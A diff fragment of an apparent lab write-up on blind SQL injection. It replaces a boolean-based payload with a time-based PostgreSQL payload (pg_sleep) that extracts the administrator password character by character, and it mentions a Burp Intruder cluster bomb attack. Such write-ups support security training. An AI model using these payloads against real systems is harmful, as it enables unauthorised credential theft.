@@ -95,7 +95,7 @@ This means: `LENGTH(password)=20`
 ### 5. Retrieve the administrator password  
 I used the following payload to test the first character of the password:     
 ```text
-' AND (SELECT SUBSTRING(password,1,1) from users WHERE username='administrator')='a'--
+'||(SELECT CASE WHEN(username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
 ```
 I marked the character position and the character as two payload positions: `SUBSTRING(password,§1§,1)='§a§'`  
 I used **Cluster bomb attack** because there are two independent values to test:  
